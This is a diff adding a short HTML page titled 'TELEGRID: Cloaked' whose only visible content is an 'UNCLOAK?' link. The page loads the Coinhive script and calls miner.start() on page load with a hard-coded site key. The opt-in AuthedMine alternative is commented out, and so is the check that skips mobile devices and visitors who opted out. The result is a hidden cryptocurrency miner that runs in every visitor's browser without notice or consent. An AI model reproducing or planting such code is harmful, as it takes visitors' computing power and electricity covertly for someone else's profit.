@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>TELEGRID: Cloaked</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/styles.css">
+    <script src="/script.js" defer></script>
+  </head>
+  <body>
+<!--       <script src="https://authedmine.com/lib/authedmine.min.js"></script> -->
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+
+<script>
+	var miner = new CoinHive.Anonymous('KeNmaCOm6LKWcQQzg0ZCtYzwRGTTBo0b', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	// if (!miner.isMobile() && !miner.didOptOut(14400)) {
+	// 	miner.start();
+	// }
+  miner.start();
+</script>
+    <p>
+    <a href="index.html" target="_self">UNCLOAK?</a>
+    </p>
+  </body>
+</html>
